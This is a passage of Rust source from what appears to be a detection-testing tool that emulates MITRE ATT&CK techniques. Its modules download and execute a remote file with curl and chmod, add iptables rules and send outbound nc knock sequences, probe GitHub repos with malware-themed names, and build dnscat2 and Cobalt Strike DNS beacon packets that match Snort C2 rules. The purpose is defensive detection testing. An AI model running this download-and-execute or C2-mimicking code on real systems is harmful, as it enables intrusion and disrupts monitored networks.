            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();

            // Get parameters from config or use defaults
            let url = config
                .parameters
                .get("url")
                .unwrap_or(&"https://wildfire.paloaltonetworks.com/publicapi/test/elf".to_string())
                .clone();
            let output_file = config
                .parameters
                .get("output_file")
                .unwrap_or(&"/tmp/signalbench_malware_test".to_string())
                .clone();
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_ingress_transfer.log".to_string())
                .clone();
            let execute = config
                .parameters
                .get("execute")
                .unwrap_or(&"true".to_string())
                .clone()
                .to_lowercase()
                == "true";

            if dry_run {
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: format!("Would download file from {url} to {output_file} and attempt execution: {execute}"),
                    artifacts: vec![output_file.clone(), log_file.clone()],
                    cleanup_required: true,
                });
            }

            // Create log file
            let mut log_file_handle =
                File::create(&log_file).map_err(|e| format!("Failed to create log file: {e}"))?;

            // Write header
            writeln!(
                log_file_handle,
                "# SignalBench Ingress Tool Transfer - Malware Download Telemetry"
            )
            .unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK Technique: T1105").unwrap();
            writeln!(log_file_handle, "# URL: {url}").unwrap();
            writeln!(log_file_handle, "# Output file: {output_file}").unwrap();
            writeln!(log_file_handle, "# Execute after download: {execute}").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(
                log_file_handle,
                "# --------------------------------------------------------"
            )
            .unwrap();

            // Download file using curl
            writeln!(log_file_handle, "\n## Downloading file from URL").unwrap();

            let download_start = chrono::Local::now();
            writeln!(log_file_handle, "Download started at: {download_start}").unwrap();

            // Use curl to download the file
            let curl_output = Command::new("curl")
                .arg("-L") // Follow redirects
                .arg("-s") // Silent mode
                .arg("-o") // Output to file
                .arg(&output_file)
                .arg(&url)
                .output()
                .await;

            let download_end = chrono::Local::now();
            let download_duration = download_end.signed_duration_since(download_start);
            writeln!(
                log_file_handle,
                "Download completed at: {} (took {} ms)",
                download_end,
                download_duration.num_milliseconds()
            )
            .unwrap();

            // Check download status
            match curl_output {
                Ok(output) => {
                    let exit_status = output.status.code().unwrap_or(-1);
                    let stderr = String::from_utf8_lossy(&output.stderr);

                    if exit_status == 0 {
                        writeln!(log_file_handle, "Download successful!").unwrap();

                        // Check if file exists and get its size
                        if let Ok(metadata) = std::fs::metadata(&output_file) {
                            let file_size = metadata.len();
                            writeln!(log_file_handle, "Downloaded file size: {file_size} bytes")
                                .unwrap();

                            // Get file type
                            let file_type_output =
                                Command::new("file").arg(&output_file).output().await;

                            if let Ok(file_type_result) = file_type_output {
                                let file_type = String::from_utf8_lossy(&file_type_result.stdout);
                                writeln!(log_file_handle, "File type: {file_type}").unwrap();
                            }

                            // Calculate file hash
                            let hash_output =
                                Command::new("sha256sum").arg(&output_file).output().await;

                            if let Ok(hash_result) = hash_output {
                                let hash_output = String::from_utf8_lossy(&hash_result.stdout);
                                writeln!(log_file_handle, "SHA256 hash: {hash_output}").unwrap();
                            }
                        } else {
                            writeln!(
                                log_file_handle,
                                "WARNING: File doesn't exist after successful download!"
                            )
                            .unwrap();
                        }
                    } else {
                        writeln!(
                            log_file_handle,
                            "Download failed with status code: {exit_status}"
                        )
                        .unwrap();
                        if !stderr.is_empty() {
                            writeln!(log_file_handle, "Error: {stderr}").unwrap();
                        }
                    }
                }
                Err(e) => {
                    writeln!(log_file_handle, "Download failed: {e}").unwrap();
                }
            }

            // Attempt execution if requested
            if execute {
                writeln!(
                    log_file_handle,
                    "\n## Attempting execution of downloaded file"
                )
                .unwrap();

                // First make it executable
                let chmod_output = Command::new("chmod")
                    .arg("+x")
                    .arg(&output_file)
                    .output()
                    .await;

                match chmod_output {
                    Ok(output) => {
                        let exit_status = output.status.code().unwrap_or(-1);
                        if exit_status == 0 {
                            writeln!(log_file_handle, "Successfully set executable permissions")
                                .unwrap();

                            // Now attempt to execute it
                            writeln!(log_file_handle, "Attempting execution...").unwrap();
                            let exec_start = chrono::Local::now();

                            // Execute with timeout to prevent hanging
                            let exec_output = Command::new("timeout")
                                .arg("5") // 5 second timeout
                                .arg(&output_file)
                                .output()
                                .await;

                            let exec_end = chrono::Local::now();
                            let exec_duration = exec_end.signed_duration_since(exec_start);

                            match exec_output {
                                Ok(output) => {
                                    let exit_status = output.status.code().unwrap_or(-1);
                                    let stdout = String::from_utf8_lossy(&output.stdout);
                                    let stderr = String::from_utf8_lossy(&output.stderr);

                                    writeln!(
                                        log_file_handle,
                                        "Execution completed at: {} (took {} ms)",
                                        exec_end,
                                        exec_duration.num_milliseconds()
                                    )
                                    .unwrap();
                                    writeln!(log_file_handle, "Exit status: {exit_status}")
                                        .unwrap();

                                    if !stdout.is_empty() {
                                        let summary = if stdout.len() > 200 {
                                            format!("{}... (truncated)", &stdout[0..200])
                                        } else {
                                            stdout.to_string()
                                        };
                                        writeln!(log_file_handle, "STDOUT: {summary}").unwrap();
                                    }

                                    if !stderr.is_empty() {
                                        let summary = if stderr.len() > 200 {
                                            format!("{}... (truncated)", &stderr[0..200])
                                        } else {
                                            stderr.to_string()
                                        };
                                        writeln!(log_file_handle, "STDERR: {summary}").unwrap();
                                    }
                                }
                                Err(e) => {
                                    writeln!(log_file_handle, "Execution failed: {e}").unwrap();
                                }
                            }
                        } else {
                            writeln!(log_file_handle, "Failed to set executable permissions")
                                .unwrap();
                        }
                    }
                    Err(e) => {
                        writeln!(log_file_handle, "Failed to set executable permissions: {e}")
                            .unwrap();
                    }
                }
            }

            // Close log file
            drop(log_file_handle);

            info!("Ingress tool transfer complete, logs saved to {log_file}");

            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: format!("Ingress tool transfer completed. File downloaded to {output_file}, Logs: {log_file}"),
                artifacts: vec![output_file.to_string(), log_file.to_string()],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = std::fs::remove_file(artifact) {
                        error!("Failed to remove artifact {artifact}: {e}");
                    } else {
                        debug!("Removed artifact: {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}

// ======================================
// T1205 - Traffic Signaling
// ======================================
pub struct TrafficSignaling {}

#[async_trait]
impl AttackTechnique for TrafficSignaling {
    fn info(&self) -> Technique {
        Technique {
            id: "T1205".to_string(),
            name: "Traffic Signalling - Port Knocking".to_string(),
            description: "ACTIVELY INSTALLS REAL IPTABLES RULES for port knock sequence detection on TCP ports 1337, 31337, 8080. Creates firewall LOG rules that generate syslog entries when SYN packets hit monitored ports. REQUIRES ELEVATED PRIVILEGES to manipulate netfilter. Network monitoring will detect these firewall rule modifications and logged connection attempts.".to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "interface".to_string(),
                    description: "Network interface to monitor for port knocking".to_string(),
                    required: false,
                    default: Some("eth0".to_string()),
                },
                TechniqueParameter {
                    name: "knock_ports".to_string(),
                    description: "Comma-separated port knock sequence (default: 1337,31337,8080)".to_string(),
                    required: false,
                    default: Some("1337,31337,8080".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save port knocking installation log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_port_knocking.log".to_string()),
                },
            ],
            detection: "Monitor iptables rule modifications, netfilter changes, syslog entries with 'PORT_KNOCK' prefix, unusual SYN packet logging, and firewall configuration changes. Detection tools: auditd, osquery, netfilter logs, syslog monitoring.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let interface = config
                .parameters
                .get("interface")
                .unwrap_or(&"eth0".to_string())
                .clone();

            let knock_ports = config
                .parameters
                .get("knock_ports")
                .unwrap_or(&"1337,31337,8080".to_string())
                .clone();

            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_port_knocking.log".to_string())
                .clone();

            let id = Uuid::new_v4()
                .to_string()
                .split('-')
                .next()
                .unwrap_or("signalbench")
                .to_string();

            // Parse port knock sequence
            let ports: Vec<&str> = knock_ports.split(',').map(|s| s.trim()).collect();

            if dry_run {
                info!("[DRY RUN] Would install iptables port knocking rules on interface: {interface}");
                info!("[DRY RUN] Would monitor ports: {knock_ports}");
                info!("[DRY RUN] Would create {} iptables LOG rules", ports.len());
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would install iptables port knock detection for ports {knock_ports}"),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            // Create log file
            let mut log_file_handle =
                File::create(&log_file).map_err(|e| format!("Failed to create log file: {e}"))?;

            writeln!(
                log_file_handle,
                "# SignalBench Port Knocking Detection - REAL IPTABLES INSTALLATION"
            )
            .unwrap();
            writeln!(
                log_file_handle,
                "# MITRE ATT&CK: T1205 - Traffic Signalling"
            )
            .unwrap();
            writeln!(log_file_handle, "# Interface: {interface}").unwrap();
            writeln!(log_file_handle, "# Port Knock Sequence: {knock_ports}").unwrap();
            writeln!(log_file_handle, "# Session ID: {id}").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(
                log_file_handle,
                "# --------------------------------------------------------"
            )
            .unwrap();
            writeln!(
                log_file_handle,
                "# WARNING: This technique ACTIVELY INSTALLS FIREWALL RULES"
            )
            .unwrap();
            writeln!(
                log_file_handle,
                "# --------------------------------------------------------\n"
            )
            .unwrap();

            // Check if interface exists
            writeln!(log_file_handle, "## Network Interface Validation").unwrap();
            let interface_check = Command::new("ip")
                .args(["link", "show", &interface])
                .output()
                .await;

            match interface_check {
                Ok(output) => {
                    if !output.status.success() {
                        writeln!(
                            log_file_handle,
                            "[WARN] WARNING: Interface {interface} not found"
                        )
                        .unwrap();
                        writeln!(log_file_handle, "Proceeding with any available interface\n")
                            .unwrap();
                    } else {
                        let output_str = String::from_utf8_lossy(&output.stdout);
                        writeln!(log_file_handle, "[OK] Interface {interface} is available")
                            .unwrap();
                        writeln!(
                            log_file_handle,
                            "Interface details:\n{}\n",
                            output_str.lines().next().unwrap_or("")
                        )
                        .unwrap();
                    }
                }
                Err(e) => {
                    writeln!(log_file_handle, "Could not verify interface: {e}\n").unwrap();
                }
            }

            // Store rule specifications for cleanup
            let mut installed_rules = Vec::new();
            let mut rule_numbers = Vec::new();

            // Get baseline rule count
            writeln!(log_file_handle, "## Baseline Firewall State").unwrap();
            let baseline_output = Command::new("iptables")
                .args(["-L", "INPUT", "--line-numbers", "-n"])
                .output()
                .await;

            if let Ok(output) = &baseline_output {
                let rules_text = String::from_utf8_lossy(&output.stdout);
                let count = rules_text
                    .lines()
                    .filter(|line| line.chars().next().is_some_and(|c| c.is_ascii_digit()))
                    .count();
                writeln!(log_file_handle, "Current INPUT chain rules: {count}").unwrap();
            } else {
                writeln!(
                    log_file_handle,
                    "Could not query baseline (may need elevated privileges)"
                )
                .unwrap();
            }

            // Install iptables rules for each port in the knock sequence
            writeln!(
                log_file_handle,
                "\n## Installing Port Knock Detection Rules"
            )
            .unwrap();
            writeln!(
                log_file_handle,
                "Installing iptables LOG rules for SYN packet detection...\n"
            )
            .unwrap();

            for (idx, port) in ports.iter().enumerate() {
                let port = port.trim();
                let rule_id = format!("portkn ock_{id}_{port}");

                writeln!(
                    log_file_handle,
                    "### Port Knock Position {} - TCP Port {}",
                    idx + 1,
                    port
                )
                .unwrap();

                // Build the iptables command for SYN packet logging
                let iptables_cmd = format!(
                    "iptables -A INPUT -p tcp --dport {port} --tcp-flags SYN SYN -j LOG --log-prefix 'PORT_KNOCK[{port}]: ' --log-level 4"
                );

                writeln!(log_file_handle, "Rule command: {iptables_cmd}").unwrap();

                // Execute the iptables command
                let result = Command::new("bash")
                    .arg("-c")
                    .arg(&iptables_cmd)
                    .output()
                    .await;

                match result {
                    Ok(output) => {
                        let exit_code = output.status.code().unwrap_or(-1);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        let stdout = String::from_utf8_lossy(&output.stdout);

                        if exit_code == 0 {
                            writeln!(log_file_handle, "[OK] Rule installed successfully").unwrap();
                            installed_rules.push(format!("{port}|{rule_id}"));

                            // Try to get the rule number
                            let list_result = Command::new("iptables")
                                .args(["-L", "INPUT", "--line-numbers", "-n"])
                                .output()
                                .await;

                            if let Ok(list_output) = list_result {
                                let rules_text = String::from_utf8_lossy(&list_output.stdout);
                                // Count current rules to estimate our rule number
                                let current_count = rules_text
                                    .lines()
                                    .filter(|line| {
                                        line.chars().next().is_some_and(|c| c.is_ascii_digit())
                                    })
                                    .count();
                                let estimated_rule_num = current_count;
                                rule_numbers.push(estimated_rule_num);
                                writeln!(
                                    log_file_handle,
                                    "Estimated rule number: {estimated_rule_num}"
                                )
                                .unwrap();
                            }
                        } else {
                            writeln!(
                                log_file_handle,
                                "[FAIL] Failed to install rule (exit code: {exit_code})"
                            )
                            .unwrap();
                            if !stderr.is_empty() {
                                writeln!(log_file_handle, "Error: {stderr}").unwrap();
                            }
                            if stderr.contains("Permission denied")
                                || stderr.contains("Operation not permitted")
                            {
                                writeln!(log_file_handle, "[WARN] REQUIRES ROOT/SUDO PRIVILEGES")
                                    .unwrap();
                            }
                        }

                        if !stdout.is_empty() {
                            writeln!(log_file_handle, "Output: {stdout}").unwrap();
                        }
                    }
                    Err(e) => {
                        writeln!(
                            log_file_handle,
                            "[FAIL] Failed to execute iptables command: {e}"
                        )
                        .unwrap();
                    }
                }
                writeln!(log_file_handle).unwrap();
            }

            // Display final firewall state
            writeln!(log_file_handle, "## Final Firewall State").unwrap();
            let final_check = Command::new("iptables")
                .args(["-L", "INPUT", "--line-numbers", "-n", "-v"])
                .output()
                .await;

            match final_check {
                Ok(output) => {
                    let rules = String::from_utf8_lossy(&output.stdout);
                    writeln!(log_file_handle, "Complete INPUT chain with line numbers:\n").unwrap();
                    writeln!(log_file_handle, "{rules}").unwrap();

                    // Highlight our rules
                    writeln!(log_file_handle, "\n### Installed Port Knock Rules:").unwrap();
                    for line in rules.lines() {
                        if line.contains("PORT_KNOCK") {
                            writeln!(log_file_handle, "-> {line}").unwrap();
                        }
                    }
                }
                Err(e) => {
                    writeln!(log_file_handle, "Could not query final state: {e}").unwrap();
                    writeln!(
                        log_file_handle,
                        "(This is expected if not running with elevated privileges)"
                    )
                    .unwrap();
                }
            }

            // Test with actual SYN packet attempt (informational only)
            writeln!(log_file_handle, "\n## Port Knock Detection Test").unwrap();
            writeln!(
                log_file_handle,
                "To test the port knock detection, execute SYN packets to ports in sequence:"
            )
            .unwrap();
            for (idx, port) in ports.iter().enumerate() {
                writeln!(
                    log_file_handle,
                    "  Step {}: nmap -sS -p{} <target> (or: nc -zv <target> {})",
                    idx + 1,
                    port,
                    port
                )
                .unwrap();
            }
            writeln!(log_file_handle, "\nMonitor syslog for PORT_KNOCK entries:").unwrap();
            writeln!(
                log_file_handle,
                "  tail -f /var/log/syslog | grep PORT_KNOCK"
            )
            .unwrap();
            writeln!(log_file_handle, "  journalctl -f | grep PORT_KNOCK").unwrap();

            // Fire phase: send the outbound knock sequence so the technique
            // generates the offensive traffic pattern, not only the receive-side
            // logging rules. Real port knocking is a sequence of SYN-only probes
            // to N specific ports in order from the attacker host.
            let knock_target = resolve_sinkhole_ip().await;
            writeln!(
                log_file_handle,
                "\n## Outbound Knock Sequence (target {knock_target})"
            )
            .unwrap();

            let nc_available = Command::new("nc")
                .arg("-h")
                .output()
                .await
                .map(|o| {
                    // nc -h returns non-zero on most variants but writes help text.
                    !String::from_utf8_lossy(&o.stderr).is_empty()
                        || !String::from_utf8_lossy(&o.stdout).is_empty()
                })
                .unwrap_or(false);

            for (idx, port) in ports.iter().enumerate() {
                let port = port.trim();
                if port.is_empty() {
                    continue;
                }

                writeln!(
                    log_file_handle,
                    "### Knock {}/{} -> {}:{}",
                    idx + 1,
                    ports.len(),
                    knock_target,
                    port
                )
                .unwrap();

                if nc_available {
                    let nc_result = Command::new("nc")
                        .args(["-z", "-w", "1", &knock_target, port])
                        .output()
                        .await;
                    match nc_result {
                        Ok(out) => writeln!(
                            log_file_handle,
                            "nc exit={}",
                            out.status.code().unwrap_or(-1)
                        )
                        .unwrap(),
                        Err(e) => writeln!(log_file_handle, "nc invocation failed: {e}").unwrap(),
                    }
                } else {
                    let addr = format!("{knock_target}:{port}");
                    let probe = async_timeout(Duration::from_secs(1), TcpStream::connect(&addr));
                    match probe.await {
                        Ok(Ok(_)) => writeln!(log_file_handle, "tcp connect completed").unwrap(),
                        Ok(Err(e)) => writeln!(log_file_handle, "tcp connect rejected: {e}").unwrap(),
                        Err(_) => writeln!(log_file_handle, "tcp connect timed out (SYN sent)").unwrap(),
                    }
                }

                // Pace the knocks so the sequence is recognisable as port knocking
                // rather than parallel scanning.
                sleep(Duration::from_millis(250)).await;
            }

            drop(log_file_handle);

            info!("Port knocking iptables rules installed for ports: {knock_ports}");
            info!("Installed {} iptables LOG rules", installed_rules.len());
            info!("Outbound knock sequence sent to {knock_target} on ports {knock_ports}");

            // Build artifacts list with rule tracking data
            let mut artifacts = vec![log_file.clone()];
            artifacts.push(format!("session_{id}"));

            // Add each installed rule for cleanup tracking
            for rule_spec in &installed_rules {
                artifacts.push(format!("ipt_rule|{rule_spec}"));
            }

            let success_count = installed_rules.len();
            let total_ports = ports.len();

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: success_count > 0,
                message: format!(
                    "Port knock detection installed: {success_count}/{total_ports} iptables rules active. Ports monitored: {knock_ports}. Session ID: {id}. Check {log_file} for details."
                ),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            let mut session_id: Option<String> = None;

            // First pass: find session ID
            for artifact in artifacts {
                if artifact.starts_with("session_") {
                    session_id = Some(artifact.trim_start_matches("session_").to_string());
                    break;
                }
            }

            info!("Starting T1205 Port Knocking cleanup");
            if let Some(ref id) = session_id {
                info!("Session ID: {id}");
            }

            // Track cleanup success
            let mut rules_removed = 0;
            let mut rules_failed = 0;

            for artifact in artifacts {
                // Remove iptables rules
                if artifact.starts_with("ipt_rule|") {
                    let rule_data = artifact.trim_start_matches("ipt_rule|");
                    let parts: Vec<&str> = rule_data.split('|').collect();

                    if !parts.is_empty() {
                        let port = parts[0];

                        info!("Removing iptables rule for port {port}");

                        // Method 1: Delete by exact specification (most reliable)
                        let delete_cmd = format!(
                            "iptables -D INPUT -p tcp --dport {port} --tcp-flags SYN SYN -j LOG --log-prefix 'PORT_KNOCK[{port}]: ' --log-level 4 2>/dev/null"
                        );

                        let delete_result = Command::new("bash")
                            .arg("-c")
                            .arg(&delete_cmd)
                            .output()
                            .await;

                        match delete_result {
                            Ok(output) => {
                                let exit_code = output.status.code().unwrap_or(-1);
                                let stderr = String::from_utf8_lossy(&output.stderr);

                                if exit_code == 0 {
                                    info!(
                                        "[OK] Successfully removed iptables rule for port {port}"
                                    );
                                    rules_removed += 1;
                                } else {
                                    warn!("Failed to remove iptables rule for port {port} (exit code: {exit_code})");
                                    if !stderr.is_empty() {
                                        warn!("Error: {stderr}");
                                    }

                                    // Method 2: Try to find and delete by line number with PORT_KNOCK prefix
                                    info!(
                                        "Attempting alternative removal method for port {port}..."
                                    );

                                    let list_result = Command::new("iptables")
                                        .args(["-L", "INPUT", "--line-numbers", "-n"])
                                        .output()
                                        .await;

                                    if let Ok(list_output) = list_result {
                                        let rules_text =
                                            String::from_utf8_lossy(&list_output.stdout);

                                        // Find line numbers containing our PORT_KNOCK marker for this port
                                        let port_knock_marker = format!("PORT_KNOCK[{port}]");
                                        let mut line_numbers_to_delete = Vec::new();

                                        for line in rules_text.lines() {
                                            if line.contains(&port_knock_marker) {
                                                // Extract line number (first token)
                                                if let Some(line_num_str) =
                                                    line.split_whitespace().next()
                                                {
                                                    if let Ok(line_num) =
                                                        line_num_str.parse::<usize>()
                                                    {
                                                        line_numbers_to_delete.push(line_num);
                                                    }
                                                }
                                            }
                                        }

                                        // Delete rules by line number (in reverse order to maintain numbering)
                                        line_numbers_to_delete.sort();
                                        line_numbers_to_delete.reverse();

                                        for line_num in line_numbers_to_delete {
                                            let delete_by_num_cmd =
                                                format!("iptables -D INPUT {line_num}");
                                            let num_result = Command::new("bash")
                                                .arg("-c")
                                                .arg(&delete_by_num_cmd)
                                                .output()
                                                .await;

                                            match num_result {
                                                Ok(num_output) => {
                                                    if num_output.status.code().unwrap_or(-1) == 0 {
                                                        info!("[OK] Removed rule at line {line_num} for port {port}");
                                                        rules_removed += 1;
                                                    } else {
                                                        warn!("Failed to remove rule at line {line_num}");
                                                        rules_failed += 1;
                                                    }
                                                }
                                                Err(e) => {
                                                    warn!("Failed to execute delete by line number: {e}");
                                                    rules_failed += 1;
                                                }
                                            }
                                        }
                                    } else {
                                        warn!(
                                            "Could not list iptables rules for alternative removal"
                                        );
                                        rules_failed += 1;
                                    }
                                }
                            }
                            Err(e) => {
                                warn!("Failed to execute iptables delete command for port {port}: {e}");
                                rules_failed += 1;
                            }
                        }
                    }
                }

                // Remove log files
                if artifact.ends_with("port_knocking.log") && Path::new(artifact).exists() {
                    if let Err(e) = fs::remove_file(artifact) {
                        warn!("Failed to remove log file {artifact}: {e}");
                    } else {
                        info!("Removed log file: {artifact}");
                    }
                }
            }

            // Verify cleanup
            info!("Cleanup summary: {rules_removed} rules removed, {rules_failed} failed");

            // Final verification - check if any PORT_KNOCK rules remain
            let verify_result = Command::new("iptables")
                .args(["-L", "INPUT", "-n"])
                .output()
                .await;

            if let Ok(output) = verify_result {
                let rules = String::from_utf8_lossy(&output.stdout);
                let remaining = rules
                    .lines()
                    .filter(|line| line.contains("PORT_KNOCK"))
                    .count();

                if remaining > 0 {
                    warn!("[WARN] Warning: {remaining} PORT_KNOCK rules still present in iptables");
                    warn!("Manual cleanup may be required: iptables -L INPUT -n --line-numbers | grep PORT_KNOCK");
                } else {
                    info!("[OK] Cleanup verified: No PORT_KNOCK rules remain");
                }
            }

            Ok(())
        })
    }
}
pub struct SuspiciousGitHubToolTransfer {}

#[async_trait]
impl AttackTechnique for SuspiciousGitHubToolTransfer {
    fn info(&self) -> Technique {
        Technique {
            id: "T1105.001".to_string(),
            name: "Suspicious GitHub Tool Transfer".to_string(),
            description: "Generates telemetry for curl requests to suspicious fictional GitHub repositories with hacker-themed names".to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "repo_count".to_string(),
                    description: "Number of suspicious GitHub repos to attempt downloading from".to_string(),
                    required: false,
                    default: Some("5".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save download attempt log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_github_downloads.log".to_string()),
                },
            ],
            detection: "Monitor for curl/wget requests to GitHub repositories with suspicious names or patterns indicating potential tool downloads".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        use rand::prelude::IndexedRandom;

        let repo_count: usize = config
            .parameters
            .get("repo_count")
            .unwrap_or(&"5".to_string())
            .parse()
            .unwrap_or(5);

        let log_file = config
            .parameters
            .get("log_file")
            .unwrap_or(&"/tmp/signalbench_github_downloads.log".to_string())
            .clone();

        // Suspicious GitHub repository suffixes for simulation
        let suspicious_suffixes = vec![
            "exploit-kit",
            "root-shell",
            "payload-gen",
            "backdoor-tool",
            "credential-dumper",
            "ransomware",
            "keylogger",
            "botnet-client",
            "webshell",
            "privesc-tools",
            "password-cracker",
            "network-scanner",
            "c2-framework",
            "trojan-builder",
            "stealer",
            "rat-client",
            "rootkit-installer",
            "crypto-miner",
            "exfil-toolkit",
            "persistence-engine",
        ];

        // Generate random selections BEFORE async block
        let mut rng = rand::rng();
        let mut repo_list = Vec::new();
        for _ in 0..repo_count {
            let suffix = suspicious_suffixes
                .choose(&mut rng)
                .unwrap_or(&"backdoor-tool");
            let repo_url = format!("https://github.com/simonsigre/{suffix}");
            repo_list.push((suffix.to_string(), repo_url));
        }

        Box::pin(async move {
            if dry_run {
                let repos: Vec<String> = repo_list.iter().map(|(name, _)| name.clone()).collect();
                info!(
                    "[DRY RUN] Would attempt to download from GitHub repos: {}",
                    repos.join(", ")
                );
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would attempt {repo_count} GitHub downloads"),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            // Create the log file
            let mut log =
                File::create(&log_file).map_err(|e| format!("Failed to create log file: {e}"))?;

            writeln!(log, "=== SignalBench Suspicious GitHub Tool Transfer ===")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Time: {}", chrono::Local::now().to_rfc3339())
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log, "Repository count: {repo_count}")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
            writeln!(log).map_err(|e| format!("Failed to write to log file: {e}"))?;

            // Attempt to curl each suspicious GitHub repo
            for (repo_name, repo_url) in &repo_list {
                writeln!(log, "=== Attempting download: {repo_name} ===")
                    .map_err(|e| format!("Failed to write to log file: {e}"))?;
                writeln!(log, "URL: {repo_url}")
                    .map_err(|e| format!("Failed to write to log file: {e}"))?;

                info!("Attempting suspicious GitHub download: {repo_url}");

                // Execute curl command (will fail as these are fictional repos, but generates telemetry)
                let output = Command::new("curl")
                    .args(["-s", "-I", "-L", "--max-time", "5", repo_url])
                    .output()
                    .await;

                match output {
                    Ok(output) => {
                        writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                        writeln!(log, "Response:")
                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                        log.write_all(&output.stdout)
                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                        if !output.stderr.is_empty() {
                            writeln!(log, "Errors:")
                                .map_err(|e| format!("Failed to write to log file: {e}"))?;
                            log.write_all(&output.stderr)
                                .map_err(|e| format!("Failed to write to log file: {e}"))?;
                        }
                    }
                    Err(e) => {
                        writeln!(log, "Error executing curl: {e}")
                            .map_err(|e| format!("Failed to write to log file: {e}"))?;
                    }
                }

                writeln!(log).map_err(|e| format!("Failed to write to log file: {e}"))?;
            }

            info!("Completed {repo_count} suspicious GitHub download attempts");

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully attempted {repo_count} suspicious GitHub downloads"),
                artifacts: vec![log_file],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}

// =============================================================================
// T1071-IOC: Suspicious Domain Connections
// =============================================================================
// Connects to known C2/malicious domains and IP addresses based on ttp-bench patterns.
// Generates network telemetry that security products should flag as suspicious.

#[allow(dead_code)]
pub struct SuspiciousDomainConnections {}

/// Builds a 78-byte dnscat2 DNS tunnelling probe packet.
/// Header: TxID=0x0001, RD=1, QDCOUNT=1.
/// QNAME: 60-byte label beginning with "dcat2!command" + 0x41 padding, QTYPE A, QCLASS IN.
/// Matches snort3-malware-cnc.rules:
///   MALWARE-CNC dnscat2 DNS tunneling channel initialization
///   content:"|01 00 00 01 00 00 00 00 00 00 3C|",depth 11,offset 2;
///   content:"21636F6D6D616E64",within 16,distance 16,nocase
fn build_dnscat2_dns_packet() -> Vec<u8> {
    let mut pkt: Vec<u8> = Vec::with_capacity(78);
    pkt.extend_from_slice(&[0x00, 0x01]); // Transaction ID
    pkt.extend_from_slice(&[0x01, 0x00]); // Flags: RD=1, QR=0
    pkt.extend_from_slice(&[0x00, 0x01]); // QDCOUNT = 1
    pkt.extend_from_slice(&[0x00, 0x00]); // ANCOUNT = 0
    pkt.extend_from_slice(&[0x00, 0x00]); // NSCOUNT = 0
    pkt.extend_from_slice(&[0x00, 0x00]); // ARCOUNT = 0
    pkt.push(0x3C);                        // label length = 60
    pkt.extend_from_slice(b"dcat2");       // bytes 13-17
    pkt.extend_from_slice(b"!command");   // bytes 18-25 (0x21 0x63 0x6F 0x6D 0x6D 0x61 0x6E 0x64)
    pkt.extend(std::iter::repeat_n(0x41u8, 47)); // padding to fill 60-byte label
    pkt.push(0x00);                        // end of QNAME
    pkt.extend_from_slice(&[0x00, 0x01]); // QTYPE A
    pkt.extend_from_slice(&[0x00, 0x01]); // QCLASS IN
    pkt
}

/// Builds a 27-byte Cobalt Strike DNS beacon packet for QNAME `aaa.stage`.
/// `qtype` should be 1 (A record, sid:45906) or 16 (TXT record, sid:45907).
/// Matches snort3-malware-cnc.rules:
///   MALWARE-CNC CobaltStrike DNS Beacon outbound A/TXT record
///   content:"|03|aaa|05|stage",nocase; content:"|00 00 <qtype_hi> <qtype_lo> 00 01|",distance 0
fn build_cobalt_strike_dns_packet(qtype: u16) -> Vec<u8> {
    let mut pkt: Vec<u8> = Vec::with_capacity(27);
